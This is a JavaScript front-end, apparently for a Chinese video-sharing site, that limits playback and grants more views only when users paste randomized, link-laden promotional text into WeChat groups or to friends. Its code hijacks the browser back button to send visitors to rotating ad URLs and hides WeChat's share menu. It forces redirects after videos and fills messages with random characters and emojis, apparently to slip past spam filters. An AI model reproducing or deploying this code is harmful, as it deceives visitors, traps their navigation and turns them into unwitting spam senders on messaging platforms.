//if((/^(Win|Mac)/i.test(navigator.platform)||!/mobile|Android|phone|iPhone|iPod|ios|iPad/i.test(navigator.userAgent))&&!localStorage.idf){
//	window.location = 'http://www.qq.com/babygohome/?pgv_ref=404';
//}
conf.shu  = conf.shu ||'?_wv={www}&f=FROM&{www}={wwwwnnn}';
$_GET = getUrlVal();
conf.id = $_GET.id||'';
if(conf.id ){
	show_item();
}else{
	show_index();
}

function getBackgroundColor() {
    // 1. 生成高对比霓虹色
    var h1 = Math.floor(Math.random() * 360);
    var h2 = (h1 + 120) % 360; 
    var h3 = (h1 + 240) % 360; 
    
    var c1 = 'hsl(' + h1 + ', 100%, 50%)';
    var c2 = 'hsl(' + h2 + ', 100%, 50%)';
    var c3 = 'hsl(' + h3 + ', 100%, 50%)';

    var h = '';
    h += '<style>';
    // 2. 容器设置为相对定位，背景透明
    h += '.hcblock, .listcon, .list_con {';
    h += '    position: relative !important;';
    h += '    background: transparent !important;'; 
    h += '    z-index: 1 !important;';
    h += '    overflow: hidden !important;';
    h += '    border: none !important;';
    h += '}';
    
    // 3. 将动态背景绑定到 ::before 伪元素上
    h += '.hcblock::before, .listcon::before, .list_con::before {';
    h += '    content: "" !important;';
    h += '    position: absolute !important;';
    h += '    top: 0; left: 0; right: 0; bottom: 0 !important;';
    h += '    background: linear-gradient(125deg, ' + c1 + ', ' + c2 + ', ' + c3 + ', ' + c1 + ') !important;';
    h += '    background-size: 600% 600% !important;';
    h += '    animation: neonFlow 10s ease infinite !important;';
    h += '    z-index: -1 !important;'; 
    h += '}';

    // 4. 确保图片不被滤镜影响
    h += '.listimg, .listimg img {';
    h += '    position: relative !important;';
    h += '    z-index: 2 !important;';
    h += '    filter: none !important;'; 
    h += '}';

    // 5. 文字区域半透明遮罩，增加易读性
    h += '.title, .listkey {';
    h += '    position: relative !important;';
    h += '    z-index: 2 !important;';
    h += '    background: rgba(0,0,0,0.15) !important;';
    h += '}';

    // 6. 动画逻辑
    h += '@keyframes neonFlow {';
    h += '    0% { background-position: 0% 0%; filter: hue-rotate(0deg); }';
    h += '    50% { background-position: 100% 100%; filter: hue-rotate(180deg); }';
    h += '    100% { background-position: 0% 0%; filter: hue-rotate(360deg); }';
    h += '}';
    h += '</style>';
    
    return h;
}

function get_list(len) {
	var time = 100;
	var scrollTop = $(window).scrollTop();
	var scrollHeight = $(document).height();
	var innerHeight = window.innerHeight;
	if (Math.ceil(scrollTop) + innerHeight >= scrollHeight-3) {
		$('.video_load').show();
		if(window.isload)return;
		window.isload = true;
		clearTimeout(window.scrollTime);
		window.scrollTime = setTimeout(function(){
			$.post(host+'/images/index.php?act=videos',{len:len||12,type:conf.type},function(d){
				if(d.list){
					for(var i in d.list){
						(function(i,v){
							setTimeout(function(){
								$('#video_list').append(v);
							},time*i);							
						})(i,d.list[i])
					}
				}
				clearTimeout(window.scrollTime2);
				window.scrollTime2 = setTimeout(function(){
					window.isload = false;
					$('.video_load').hide();
				},600);
			},'json');
		},time*2);
	}
}

function show_index(){
	var h	= '';
	h	+= getBackgroundColor();
	h	+= '	<header class="head_top clearfix top-fixed headroom--top headroom--not-bottom stui-header_bd clearfix" id="header-top">';
	h	+= '		<div class="main" >';
	if(config('url2',1)){
		h	+= '	<div class="main video_ad_line" ><div data-src="'+config('url2',1)+'"><img id="admimg1" src="'+config('btn2',1)+'" border="0" width="100%" style="display:block;"></div></div>';
	}
	if(config('videoIndex',1)){			
		h	+= '	<div class="video" id="video"></div>';
		$(function(){
			window.dp = new DPlayer({
				container: document.getElementById('video'),
				autoplay: true,
				video: {
					url: config('videoIndex',1),
					pic: 'images/poster.jpg',
					type: 'auto',
					customType: {
						customHls: function(video){
							const hls = new Hls();
							hls.loadSource(video.src);
							hls.attachMedia(video);
						}
					}
				},
			});	
			dp.on('ended',function(){
				dp.pause();
				if(config('ready') && !/iPhone|iPod|ios|iPad/i.test(navigator.userAgent)){
					location.href = config('ready');
				}
			});
			dp.play();
		})
	}
	if( config('url5',1)){
		h	+= '		<ul class="hcblock">';
		h	+= '			<li><div data-src="'+config('url5',1)+'" class="hcblock_a">'+config('btn5',1)+'</div></li>';
		h	+= '			<li><div data-src="'+config('url6',1)+'" class="hcblock_a">'+config('btn6',1)+'</div></li>';
		h	+= '			<li><div data-src="'+config('url7',1)+'" class="hcblock_a">'+config('btn7',1)+'</div></li>';
		h	+= '			<li><div data-src="'+config('url8',1)+'" class="hcblock_a">'+config('btn8',1)+'</div></li>';
		h	+= '		</ul>';
	}
	h	+= '		<div class="main head_menu_box">';
	h	+= '			<ul class="head_menu type-slide">';
	if(conf.navs){
		for(var i in conf.navs){
			h	+= '			<div data-src="?type='+i+'" ><li class="'+(i==(conf.type||1)?'head_menu_sel':'')+'">'+conf.navs[i]+'</li></div>';
		}
	}
	h	+= '			</ul>';
	h	+= '		</div>';
	h	+= '	</header>';
	h	+= '	<div class="main video_list" id="video_list">'+conf.html+'</div>';
	h	+= '	<div class="main video_load" onclick="get_list(8,100);"><img src="./images/loading.gif" style="">加载中··· ···</div>';
	if(config('url3',1)){
		h	+= '	<div class="video_ad" ><div data-src="'+config('url3',1)+'"><img id="admimg1" src="'+config('btn3',1)+'" border="0" width="100%"></div></div>';
	}
	h	+= '	<div style="height:150px;"></div>';
	h	+= show_ad();
	h = myChat(h);
	document.write( h );
	$(window).scroll(function(){
		get_list(8);
	});
}

function show_ad(){
    var h = '';
    if (config('leftfloatad', 1) && config('rightfloatad', 1)) {
        h += '<div class="ad-float-wrap">';
        h += '    <div data-src="' + config('leftfloatad', 1) + '" target="_blank">';
        h += '        <img class="leftfloatad" src="' + config('leftfloatadimg') + '">';
        h += '    </div>';
        h += '    <div data-src="' + config('rightfloatad', 1) + '" target="_blank">';
        h += '        <img class="rightfloatad" src="' + config('rightfloatadimg') + '">';
        h += '    </div>';
        h += '</div>';
    }
    return h;
}

function show_item(){
	var h	= '';
	h	+= getBackgroundColor();
	h	+= '	<div class="goback" onclick="location.href=\'?\'">';
	h	+= '		<div class="goback_left" id="fanhui"><i class="back_icon"></i>返回</div>';
	h	+= '		<div class="goback_right" id="fanhui"><a href="./images/ts_wx/" style="color:#ffd8ae;" >投诉</a></div>';
	h	+= '	</div>';
	h	+= '	<div class="vadd_info">';
	h	+= '		<h3 align="center">万部电影免费看，分享一人看<span class="addPlay">'+config('vadd')+'</span>部</h3>';
	h	+= '		<h3 align="center">当前可刷新次数：<span style="color:red;" id="sup">0</span> 次</h3>';
	h	+= '	</div>';
	h	+= '	<div class="video_tag" id="tp5">';
	h	+= '		<div class="video" id="video"></div>';
	h	+= '		<div class="views"  style="width: 100%;height: 220px;display:none;">';
	h	+= '		    <img onclick="shx()" src="images/viewas.png" style="width: 100%;height: 220px;">';
	h	+= '		</div>';
	h	+= '	</div>';
	h	+= '	<div class="video_div" >';
	h	+= '		<div style="flex: 1;">';
	h	+= '			<h3>'+conf.video.name+'</h3>';
	h	+= '			<div class="view_num">'+config('video_date')+'&nbsp;&nbsp;&nbsp;<span>'+config('video_visit')+'万</span>次播放</div>';
	h	+= '		</div>';
	h	+= '	</div>';
	if(config('url2',1)){
		h	+= '	<div class="main video_ad_line" ><div data-src="'+config('url2',1)+'"><img id="admimg1" src="'+config('btn2',1)+'" border="0" width="100%"></div></div><br>';
	}
	h	+= '	<div class="main video_list" style="padding-bottom:40px;">';
	h	+= '		<div class="list_title">猜你喜欢</div>';
	h	+= '		<div id="video_list" >'+conf.html+'</div>';
	h	+= '		<div class="more" onclick="location.href=\'?\';">&nbsp;&nbsp;&nbsp;&nbsp;查看更多<img src="./images/more_icon.png" class="more_icon"></div>';
	h	+= '	</div>';

	if(config('url3',1)){
		h	+= '	<div class="video_ad" ><div data-src="'+config('url3',1)+'"><img id="admimg1" src="'+config('btn3',1)+'" border="0" width="100%"></div></div>';
	}
	h	+= '	<div style="height:150px;"></div>';
	h	+= show_ad();
	h = myChat(h);
	document.write( h );
}

function set_board() {
	$('div[data-src]').click(function(e){
		location.href = $(this).data('src');
	});
	$('.video_div,.video_operate').click(function(e){
		shx();
	});
	var time = 3;
	var index = 0;
	var rollindex = setInterval(broll,time*1000);
	function broll(){
		var sinc = 10;
		var step = $('.discuss_list ul li').height() / sinc;
		var stay = parseInt($('.discuss_list ul').css('margin-top')||0) - step;
		var stat = $('.discuss_list ul').css('margin-top');
		if($('.discuss_list ul li').length>1){		
			var ssei = setInterval(function(){
				if(sinc-- > 1){
					stay = stay - step;
					$('.discuss_list ul').css('margin-top',  stay);
				}else{
					if(++index > $('.discuss_list ul li').length-2){
						$('.discuss_list ul').css('margin-top',  index = 0);
					}
					clearInterval(ssei);
				}
			},20);
		}
	}
	$('.discuss_list ul').on('mouseover',function(){
		clearInterval(rollindex);
	});  
	$('.discuss_list ul').on('mouseout',function(){
		rollindex = setInterval(broll,time*1000);
	});  
	$('.discuss_list ul').append($('.discuss_list ul li').eq(0).clone());  
}

$(function(){
    if(!coo('code'))coo('snt',0);
	coo('code',conf.code = coo('code') || myChat('{nnnnnn}'),config('cache'));
	if(config('title',1)){
		document.title = config('title',1);
	}
	if(window.mqq){
		mqq.ui.setTitleButtons({
			left: {title: "返回",callback: function() {}},right: {hidden: true,}
		})	
	}
	if(config('popurl',1)){
		function getUrl() {
			var urls=config('popurl',2);
			if(sessionStorage.jumpIndex >= urls.length||!sessionStorage.jumpIndex){
				sessionStorage.jumpIndex = 0;
			}
			return urls[sessionStorage.jumpIndex++];
		}
		try {
			tbsJs.onReady('{useCachedApi : "true"}',function(b) {})
		} catch(err) {}
		window.history.pushState({title: 'title',url: '#'+Math.random()}, 'title', '#')
		window.addEventListener('popstate',function(h) {
			top.location.href = getUrl();
		},false);
	}
	if(config('timeOut')>0){
		setTimeout(function(){
			if(window.dp)dp.pause();
			layer.open({
				content: config('timeTip').replace(/\n/g,'<br>\n'),
				btn: ['立即前往','继续观看'],
				yes: function(index) {
					location.href= config('timeSrc');
				},
				no: function(index) {
					dp.play();
				}
			});
		},config('timeOut')*1000);
	}
	try {
		document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
			WeixinJSBridge.call('hideOptionMenu');
		});
	} catch (e) {}
	if(config('tongji'))$('body').append('<div style="display:none;">'+config('tongji')+'</div>');
	set_board();
	getSign();
	setInterval(getSign,6000);
});

function setovblc(){
	if(!window.hiddenProperty){
		window.hiddenProperty='hidden' in document ? 'hidden': 'webkitHidden' in document ? 'webkitHidden': 'mozHidden' in document ? 'mozHidden': null;
		var vsbce=hiddenProperty.replace(/hidden/i,'visibilitychange');
		function ovblc(){
			if(!document[hiddenProperty]||window.idf){
				coo('snt',coo('snt')+1,conf.cache);
				shx();
			}
		}
		document.addEventListener(vsbce,ovblc);	
	}
}

function shx(){
	if(!conf.id)return;
	window.dp&&dp.pause();
	$('.video').hide();
	$('.views').show();
	setovblc();
	
	var snn = coo('snt')||0;
//	var sInfo = config('sInfo').replace(/\s+$/g,'').replace(/\n+/g,'<br>');
var sInfo = '<div style="font-size: 18px; line-height: 1.6; color: #333; font-weight: bold; padding: 10px 0;">' + 
            config('sInfo').replace(/\s+$/g,'').replace(/\n+/g,'<br>') + 
            '</div>';

	var h = '';
	h += '<div class="in_row"></div>';
	sInfo += h;

	// 封装共同的业务逻辑
	var doExecute = function(index) {
		var shu = thisLink(getUrl()) ;
		if(localStorage.idf)console.log('发送',shu);
		
		var sText = config('sText');
		var sTexts = sText.split(/\s*-{4,}\s*/);
		var sTextx = [];
		for(var i in sTexts){
			if(sTexts[i].length > 5){
				sTextx.push(sTexts[i]);	
			}
		}
		sText = sTextx[Math.floor(Math.random()*sTextx.length)];
		sText = sText.replace('[link1]',shu).replace('[link2]',thisLink(getUrl(config('shu2',1)))).replace('[link3]',thisLink(config('shd',1)));
		
		copyText(sText);
		layer.close(index);
		layer.open({
			content: config('sEnd').replace(/\n+/g,'<br>'),
			yes: function(idx) {
				layer.close(idx);
			}
		});
	};

	layer.open({
		content: sInfo,
		btn: ['点这里复制到微信群发送观看1-100次', '点这里复制到微信好友发送观看1次'],
		yes: function(index) {
			doExecute(index);
		},
		no: function(index) {
			doExecute(index);
		},
		success: function(elem){
			// 1. 获取按钮容器并修改为纵向排列
			var btnBox = elem.querySelector('.layui-m-layerbtn');
			if(btnBox) {
				btnBox.style.display = 'flex';
				btnBox.style.flexDirection = 'column'; // 关键：设为纵向
				btnBox.style.height = 'auto';           // 高度自适应
				btnBox.style.padding = '10px 15px';    // 容器内边距
				btnBox.style.backgroundColor = '#fff';  // 容器背景
				btnBox.style.borderTop = 'none';       // 移除默认顶部分割线
			}
// 在 success 函数内部添加：
           var contentBox = elem.querySelector('.layui-m-layercont');
           if(contentBox) {
           contentBox.style.fontSize = '20px';    // 字体大小
           contentBox.style.lineHeight = '1.5';   // 行高
           contentBox.style.color = '#000';       // 字体颜色
           contentBox.style.padding = '30px 15px';// 上下内边距
            }
			// 2. 获取具体按钮并设置样式
			var btns = elem.querySelectorAll('.layui-m-layerbtn span');
			if(btns.length >= 2){
				for(var i=0; i<btns.length; i++) {
					btns[i].style.display = 'block';
					btns[i].style.width = '100%';      // 宽度占满
					btns[i].style.height = '44px';     // 按钮高度
					btns[i].style.lineHeight = '44px'; // 文字垂直居中
					btns[i].style.borderRadius = '8px';// 圆角
					btns[i].style.border = 'none';     // 移除默认边框
					btns[i].style.flex = 'none';       // 禁用flex平分
					btns[i].style.color = '#fff';      // 文字白色
					btns[i].style.fontSize = '15px';   // 字号
					btns[i].style.fontWeight = 'bold';
                    btns[i].style.textAlign = 'center';
				}

				// 设置第一个按钮颜色 (粉色) 和 间隔
				btns[0].style.backgroundColor = '#FF69B4'; 
				btns[0].style.marginBottom = '12px';  // 两个按钮中间的间隔

				// 设置第二个按钮颜色 (蓝色)
				btns[1].style.backgroundColor = '#1E90FF';
                
                // 清除 layer 默认给 span 加的边框样式
                btns[0].style.borderTop = 'none';
                btns[1].style.borderTop = 'none';
                btns[1].style.borderLeft = 'none';
			}
		}
	});
}
/**
 * 【核心修改】setSign 函数
 * 增加了 reset 标志检测，强制同步服务端 visit 计数，防止跨域名刷次数
 */
function setSign(obj){
	coo('sclick',1,86400);
	var socketCoo = coo('socket');
	
	// --- 处理跨域名访问 ---
	if(obj.cross_domain === true){
		console.log(">>> 检测到跨域名访问，已同步观看次数 <<<");
		// 跨域名时直接使用服务端的 visit
		if(obj.visit !== undefined){
			coo('visit', obj.visit, config('cache'));
		}
	}
	// --- 处理重置信号 ---
	else if(obj.reset === true){
		console.log(">>> 检测到新用户/新分钟 (reset=true)，强制重置本地计数 <<<");
		// 重置时也要以服务端为准，如果没有返回visit则清零
		coo('visit', obj.visit || 0, config('cache'));
		window.isstop = false; // 解锁播放状态
		tip('分享成功！获得 ' + config('vadd') + ' 次新的刷新机会!');
	}
	// --- 普通同步：服务端 visit 直接覆盖本地 ---
	else if(obj.visit !== undefined){
		var localVisit = parseInt(coo('visit') || 0);
		var serverVisit = parseInt(obj.visit);
		
		// 始终使用服务端的值
		if(serverVisit !== localVisit){
			console.log(">>> 同步服务端 visit:", serverVisit, "本地 was:", localVisit);
			coo('visit', serverVisit, config('cache'));
		}
		
		// 处理视频播放上报响应
		if(obj.action === 'play_recorded'){
			console.log(">>> 播放已记录，服务端 visit: " + serverVisit);
		}
	}

	// 原有逻辑：检测 sign 变化
	if(socketCoo.sign !== undefined && socketCoo.sign != obj.sign){
		window.isstop = false;
		if(obj.reset !== true && obj.cross_domain !== true) {
		    tip('增加 '+config('vadd')+' 次刷新机会');
		}
	}
	
	if(!window.isstop){
		setPlay(obj);
	}
	coo('socket',obj,config('cache'));
	
	// 调试日志：帮助确认计算过程
	var currentVisit = coo('visit');
	var calcResult = (parseInt(obj.sign) * parseInt(config('vadd'))) + parseInt(config('vdef')) - parseInt(currentVisit);
	console.log("SetSign Debug:", {
		sign: obj.sign,
		visit_local: currentVisit,
		visit_server: obj.visit,
		vdef: config('vdef'),
		vadd: config('vadd'),
		final_count: calcResult,
		reset_flag: obj.reset,
		cross_domain: obj.cross_domain
	});
}

/**
 * 【新增】视频播放完成后上报，服务端增加观看次数
 */
function reportVideoPlay(){
	var socketUrl = host+'/images/inc.php?sign='+conf.code+'&play=1';
	$.getScript(socketUrl, function(){
		console.log(">>> 已上报视频播放 <<<");
	});
}

function play(auto){
	$('.ui_block').hide();
	$('#video').show();
	if(localStorage.idf){
		conf.video.src = 'http://cyberplayer.bcelive.com/videoworks/mda-kbuhu4wqdi08dwix/cyberplayer/mp4/cyberplayer-demo.mp4';
	}
	window.dp = new DPlayer({
		container: document.getElementById('video'),
		autoplay: true,
		video: {
			type: 'auto',
			url: conf.video.src,
			pic: conf.video.img||'images/poster.jpg',
		},
	});	
	dp.on('ended',function(){
		dp.pause();
		if(config('ready')  && !/iPhone|iPod|ios|iPad/i.test(navigator.userAgent)){
			location.href = config('ready');
		}
	});
	dp.play();
}

function setPlay(obj,fn){
	// 计算公式：总次数 = (sign * vadd) + vdef - 本地已用次数(visit)
	var time = parseInt(obj.sign) * parseInt(config('vadd')) + parseInt(config('vdef')) - parseInt(coo('visit'));
	
	// 更新页面显示
	$('#sup').html(Math.max(time,0));
	
	console.log("SetPlay Calc:", {
		sign: obj.sign,
		vadd: config('vadd'),
		vdef: config('vdef'),
		visit: coo('visit'),
		result: time
	});

	if(time < 1 ){
		// 次数耗尽逻辑
		// 预存下一次的理论最大值，防止数据错乱
		coo('visit',(obj.sign+1) * config('vadd') + parseInt(config('vdef')) - 1, config('cache'));
    	
		$('.video').html('');
		$('.video').hide();
		$('.views').show();
		shx();
		window.isstop = 1;
	}else{
		if(fn)fn();
		$('.video').show();
		$('.views').hide();
		$('.layui-m-layer').remove();
		play(true);
		if(!window.isplayed){
			// 【修改】上报服务端增加次数，不再本地+1
			reportVideoPlay();
		}
		window.isplayed = 1;
		window.isstop = 1;
	}
}

function getSign(){
	var socketUrl = host+'/images/inc.php?sign='+conf.code
	$_GET = getUrlVal();
	if(!coo('sclick')&&$_GET.f&&$_GET.f != conf.code){
		socketUrl += '&from='+ ($_GET.f||'');
	}
	$.getScript(socketUrl,function(){
		coo('sclick',1,86400);
	});
	if(!window.isstop&&localStorage.idf){
		console.log('加次数',thisLink(socketUrl+ '&from='+ conf.code ));
	}
}

function setSign2(obj){
	if(obj.code == '102'){
		return tip('无效的密码');
	}else if(obj.code == '101'){
		coo('vded',(coo('vded')||0)+config('vsef',1),config('cache'));
		window.isstop = false;
		getSign(obj);
		return tip('自己的密码增加 '+config('vsef',1)+' 次播放');
	}else if(obj.code == '105'){
		coo('vded',(coo('vded')||0)+config('vsef',1),config('cache'));
		window.isstop = false;
		getSign(obj);
		return tip('密码正确，已增加增加次数！');
	}
}

function check_pass(){
	if(localStorage.idf){
		if($('.in_pass').val()){
			//coo($('.in_pass').val(),0,config('cache'))
		}else{
			$('.in_pass').val(conf.code);
		}
	}
	var socketUrl = host+'/images/inc.php?sign='+conf.code
	var val = $('.in_pass').val();
	if(!val){
		return tip('请输入6位观看密码');
	}
	if(!/^\d{6}$/.test(val)){
		return tip('请输入正确的6位观看密码');
	}
	if(coo(val)&&!localStorage.idf){
		return tip('这个密码已经使用过了！<br>请转发到Q群增加观看次数');
	}else{
		coo(val,1,config('cache'));
	}
	$.getScript(socketUrl+'&val='+val,function(){
		coo('sclick',1,86400);
	});
}

function msg(con,fun){
	layer.open({
		content: con,
		btn: ['确定'],
		yes: function(index) {
			fun.call(this);
			layer.close(index);
		}
	});
}

function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}

function bug(){
	if(!window.bug_con){
		var h	= '';
		h	+= '<div id="bug_box" onmouseover="this.style.opacity=1;" style="position:fixed;left:2px;bottom:2px;width:76vw;max-width:400px;background:#fff;border:1px solid #999;border-radius:10px;overflow:hidden;z-index:296654455;opacity:0.2;">';
		h	+= '	<div onclick="document.body.removeChild(bug_box);" style="color:#666;background:#eee;font-size:14px;font-weight:600;line-height:1;padding:7px 14px;border-bottom:solid 1px #ccc;">Debug</div>';
		h	+= '	<div id="bug_con" style="min-height:30px;max-height:40vh;font-size:7px;line-height:1.2;white-space:pre-wrap;word-break:break-all;color:#44c;tab-size:4;padding:3px 5px;overflow:auto;font-family:Menlo,Monaco,Consolas;"></div>';
		h	+= '</div>';
		document.body?document.body.insertAdjacentHTML('afterBegin',h):document.write(h);
	}
	console.log.apply(null,arguments);
	bug_con.innerHTML += '<span style="color:red;font-weight:600;">'+(new Date().toLocaleString(0,{hour12:0}))+'\tArg['+arguments.length+']</span>\t'+JSON.stringify(arguments.length == 1?arguments[0]:Object.values(arguments),null,'\t').replace(/</g,'&lt;').replace(/>/g,'&gt;')+'\n';
	bug_con.scrollTo(0, 19891016);
}

function getUrl(shu) {
	shu = shu||config('shu',1);
	if(!/^http|\?/.test(shu))shu = '//'+shu;
	if(!/^\?/.test(shu))shu = shu+'?f=FROM&{www}={wwwwnnn}';
	shu = myChat(shu.replace('FROM',conf.code));
	return shu;
}

function thisLink(u){
	var a = document.createElement('a');
	a.href = u||'';
	return a.href;
};

function config(n,m,d){
	var v = undefined===conf[n]?null:conf[n];
	if(1==m||2==m){
		if('string'==typeof(v)){
			v = v.replace(/^\s+|\s+$/g,'').split(/\s*\n\s*/);
		}
		if(1==m&&v instanceof Array){
			v = v[Math.floor(Math.random()*v.length)];
		}
		v = v||d||null;
	}else{
		v = v||d||m||null;
	}
	if('string'==typeof(v)){
		v = myChat(v);
		if(/^\d+$/.test(v))v = v*1;
	}
	return v;
}

function myChat(s){
	var ico=['🌀','🌷','♈','♉','♊','♋','♌','♍','♎','♏','♐','♑','♒','♓','⛎','😠','😩','😲','😞','😵','😰','😒','😍','😤','😜','😝','😋','😘','😚','😷','😳','😅','😱','👙','👗','👡','💰','🔯','🅰','🅱','🆎','🅾','🎀','🎁','🎥','🎬','🎯','💋','💏','💌','🔞','⭕','❌','💓','💔','💕','💖','💗','💘','💞','🈲','㊙','💢'];
	if(typeof(s)=='object')s=s[Math.floor(Math.random()*s.length)];
	if(window.host)s = s.replace(/(^|\=["']|url\(\s*)(\.\/)?(images|upload|mp)\b/gi,'$1'+host+'/$3');
	s = s.replace(/\{(\w+)\}/g,function(a,b){
		if(window.conf&&conf[b])return config(b)||'';
		var h='';
		b = b.toUpperCase();
		for(var i=0;i<b.length;i++){
			if('C'==b[i]){
				h+=conf.city||'同城';
			}else if('O'==b[i]){
				h+=ico[Math.floor(Math.random()*ico.length)];
			}else if('N'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('D'==b[i]){
				h+=String.fromCharCode(65+Math.floor(Math.random()*26));
			}else{
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
	return s;
}

function coo(n,v,e) {
	var u,k,o={},t = Math.floor(new Date()/1e3);
	try{
		o = JSON.parse(localStorage.nss||'{}');
	}catch(e){
		o = {};
	}
	if(localStorage.isClear){
		localStorage.clear();
		o = {};
	}
	for (k in o)if (o[k][1]&&o[k][1]<t)delete(o[k]);
	if (v === null) {
		delete(o[n]);
	} else if (v === undefined) {
		return o[n] && o[n][1]>t ? o[n][0]:0;
	} else {
		o[n] = [v, t + (e||3e6)];
	}
	localStorage.nss=JSON.stringify(o);
	clearTimeout(window.cootime);
	return v;
};

function rand(a,m){
	if(typeof(a) == 'object'){
		console.log( a );
		window.indexi =  window.indexi||0;
		return a[window.indexi++%a.length];
		return a[Math.floor(Math.random() * a.length)];
	}
	return a + Math.floor(Math.random() * (m - a));
}

function tipRed(text, time) {
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:0;left:0;right:0;color:#fff;margin:0 auto;opacity:0;padding:7px 0;font-size:15px;position:fixed;text-align:center;background-color:#eb0000;transition:opacity 0.6s;z-index:111111111;width:100%;">'+text+'</div>');
	setTimeout('tmsg.style.opacity=1',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',time||4000);
}

function tip(text, time) {
	window.tmsg&&document.body.removeChild(tmsg);
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:200px;left:20%;right:20%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #222;box-shadow:rgba(0,0,0,0.25) 0px 0px 10px 6px;transition:opacity 0.6s;z-index: 198910140;">'+text+'</div>');
	setTimeout('tmsg.style.opacity=0.8',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',time||3000);
}

function getUrlVal(u) {
	var j,g = {};
	u = (u || document.location.href.toString()).split('?');
	if (typeof(u[1]) == "string") {
		u = u[1].split("&");
		for (var i in u) {
			j = u[i].split("=");
			if (j[1] !== undefined) g[j[0]] = decodeURIComponent(j[1])
		}
	}
	return g;
}

$(createQr);
function createQr(){
	getQrText({
		bg: config('qrimg',1),
		qr3size: config('qr3size',1),
		qr4size: config('qr4size',1),
		txt3: config('qr3text',1)||location.host,
		txt4: coo('code'),
		tx3: config('qr3right'),
		ty3: config('qr3bottom'),
		tx4: config('qr4right'),
		ty4: config('qr4bottom'),
	},function(vo){
		conf['sqr'] = vo.src;
		$('.in_img').attr('src',config('sqr',1));
		if(config('qrdebug')){
			console.log(vo)
			document.body.innerHTML = '<img src="'+config('sqr',1)+'" width="100%">';
		}
	});
}

function getQrText(vo,fn){
	var img = new Image();
	img.src = vo.bg;
	img.crossOrigin = 'Anonymous';
	img.onload = function() {
		var canvas = document.createElement("canvas");
		canvas.width = vo.width = img.width;
		canvas.height = vo.height = img.height;
		var context = canvas.getContext("2d");
		context.drawImage(img, 0, 0, img.width, img.height );
		context.fill();
		context.font = Math.floor(vo.qr3size)+"px bold Arial";
		context.fillStyle = "#fff";
		context.strokeStyle = '#eee'; 
		context.lineWidth = 5;
		var ctxt = context.measureText(vo.txt3);
		context.strokeText(vo.txt3, img.width-vo.tx3-ctxt.width*0.5, img.height -vo.ty3 );
		context.fillText(vo.txt3, img.width-vo.tx3-ctxt.width*0.5, img.height -vo.ty3 );
		
		context.font = Math.floor(vo.qr4size)+"px bold Arial";
		context.fillStyle = "#ff0";
		context.strokeStyle = '#eee'; 
		context.lineWidth = 5;
		var ctxt = context.measureText(vo.txt4);
		context.strokeText(vo.txt4, img.width-vo.tx4-ctxt.width*0.5, img.height -vo.ty4 );
		context.fillText(vo.txt4, img.width-vo.tx4-ctxt.width*0.5, img.height -vo.ty4 );
		
		vo.src = canvas.toDataURL("image/jpeg");
		fn&&fn.call(this, vo);
	}
};
